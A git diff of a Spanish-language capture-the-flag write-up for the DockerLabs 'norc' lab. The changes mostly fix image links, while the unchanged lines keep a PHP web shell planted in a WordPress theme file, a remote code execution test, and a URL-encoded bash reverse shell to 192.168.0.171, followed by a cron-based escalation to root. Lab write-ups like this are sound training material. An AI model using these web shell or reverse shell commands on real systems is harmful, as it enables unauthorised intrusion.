@@ -346,7 +346,7 @@ system($_GET['cmd'])
 ```
 
 
-![CMD_RCE](/assets/images/posts/DockerLabs/norc/wordpres1.png){: .align-center}
+![CMD_RCE](/assets/images/posts/DockerLabs/norc/cmd.png){: .align-center}
 
 
 La **Ejecución Remota de Código (RCE)** se confirmó inmediatamente mediante la ejecución del comando `id` a través del navegador:
@@ -359,7 +359,8 @@ http://norc.labs/wp-content/themes/twentytwentytwo/functions.php?cmd=id
 Navegando a `http://norc.labs/wp-content/themes/twentytwentytwo/functions.php?cmd=id`
 Confirmé que podía ejecutar comandos en el sistema.
 
-![](https://litio7.github.io/assets/img/dockerlabs-writeup-norc/norc1_18.png)](https://litio7.github.io/assets/img/dockerlabs-writeup-norc/norc1_18.png)
+![ID](/assets/images/posts/DockerLabs/norc/id.png){: .align-center}
+
 
 **URL** encodeada para consegir *acceso* remoto:
 `http://norc.labs/wp-content/themes/twentytwentytwo/functions.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.171%2F1234%200%3E%261%22`.
@@ -469,7 +470,7 @@ como se realizo la codificacion del comando **/bin/bash -c 'bash -i >& /dev/tcp/
 dejando por ultimo a la ventana de abajo a la derecha con el acceso como el usuario **kvzlx**
 
 
-![Up_1](/assets/images/posts/DockerLabs/norc/up1.png){: .align-center}
+![Up_1](/assets/images/posts/DockerLabs/norc/up_1.png){: .align-center}
 
 Tras esperar el intervalo de ejecución programado del Cron Job (típicamente un minuto), la carga útil se ejecutó con éxito. Esto resultó en una nueva conexión de _reverse shell_ en el puerto 4444.
 
@@ -527,8 +528,7 @@ root
 ```
 
 
-![Root](/assets/images/posts/DockerLabs/norc/root.png){: .align-center}
-![[Pasted image 20251104163028.png]]
+![Root](/assets/images/posts/DockerLabs/norc/root.png){: .align-center} 
 
 
 ## 8. ⛓️ Cadena de Ataque (Attack Kill Chain)
